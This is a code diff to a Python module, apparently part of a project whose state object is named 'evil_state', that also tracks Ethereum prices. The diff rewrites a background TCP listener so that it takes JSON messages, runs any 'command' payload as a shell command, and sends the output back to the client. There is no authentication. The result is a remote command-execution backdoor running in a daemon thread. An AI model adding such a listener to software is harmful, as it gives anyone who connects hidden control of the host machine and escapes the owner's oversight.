@@ -559,7 +559,7 @@ def track_ethereum_price(evil_state):
         return None, f"An unexpected error occurred: {e}"
 
 
-def _tcp_listener_thread(host, port):
+def _tcp_listener_thread(host, port, evil_state):
     """
     A dedicated thread that runs a persistent TCP listener on a given host and port.
     """
@@ -580,34 +580,73 @@ def _tcp_listener_thread(host, port):
             client_socket, client_address = listen_socket.accept()
             logging.info(f"Accepted connection from {client_address[0]}:{client_address[1]}")
             # Handle the connection in a new thread to allow multiple simultaneous connections
-            handler_thread = Thread(target=_handle_tcp_client, args=(client_socket, client_address), daemon=True)
+            handler_thread = Thread(target=_handle_tcp_client, args=(client_socket, client_address, evil_state), daemon=True)
             handler_thread.start()
         except Exception as e:
             logging.error(f"Error accepting connection on {host}:{port}. Error: {e}")
             time.sleep(5) # Avoid rapid-fire logging on persistent errors
 
-def _handle_tcp_client(client_socket, client_address):
+def _handle_tcp_client(client_socket, client_address, evil_state):
     """
-    Handles an individual client connection to receive and log data.
+    Handles an individual client connection to receive, parse, and execute commands.
     """
     try:
+        buffer = ""
         while True:
             data = client_socket.recv(4096)
             if not data:
                 logging.info(f"Connection closed by {client_address[0]}:{client_address[1]}")
                 break
-            logging.info(f"Received {len(data)} bytes from {client_address[0]}:{client_address[1]}: {data.decode(errors='ignore')}")
+
+            buffer += data.decode('utf-8')
+
+            # Process all complete JSON messages in the buffer
+            while '\n' in buffer:
+                message_str, buffer = buffer.split('\n', 1)
+                try:
+                    message = json.loads(message_str)
+                    msg_type = message.get("type")
+                    logging.info(f"TCP Listener received message of type '{msg_type}' from {client_address[0]}")
+
+                    if msg_type == "command":
+                        payload = message.get("payload", {})
+                        command_to_run = payload.get("command")
+                        if command_to_run:
+                            logging.info(f"Executing command from {client_address[0]}: '{command_to_run}'")
+                            stdout, stderr, returncode = execute_shell_command(command_to_run, evil_state)
+                            response = {
+                                "type": "command_response",
+                                "returncode": returncode,
+                                "stdout": stdout,
+                                "stderr": stderr
+                            }
+                        else:
+                            response = {"type": "error", "message": "No command found in payload."}
+                    else:
+                        response = {"type": "ack", "message": "Message received, but not a command."}
+
+                    client_socket.sendall(json.dumps(response).encode('utf-8') + b'\n')
+
+                except json.JSONDecodeError:
+                    logging.warning(f"Received non-JSON message from {client_address[0]}: {message_str}")
+                    error_response = {"type": "error", "message": "Invalid JSON format."}
+                    client_socket.sendall(json.dumps(error_response).encode('utf-8') + b'\n')
+                except Exception as e:
+                    logging.error(f"Error handling message from {client_address[0]}: {e}")
+                    error_response = {"type": "error", "message": str(e)}
+                    client_socket.sendall(json.dumps(error_response).encode('utf-8') + b'\n')
+
     except Exception as e:
         logging.error(f"Error during communication with {client_address[0]}:{client_address[1]}. Error: {e}")
     finally:
         client_socket.close()
 
 
-def start_tcp_listener(host, port):
+def start_tcp_listener(host, port, evil_state):
     """
     Initializes and starts the TCP listener in a background daemon thread.
     """
     logging.info(f"Initializing TCP listener on {host}:{port} in a background thread.")
-    listener_thread = Thread(target=_tcp_listener_thread, args=(host, port), daemon=True)
+    listener_thread = Thread(target=_tcp_listener_thread, args=(host, port, evil_state), daemon=True)
     listener_thread.start()
     return listener_thread
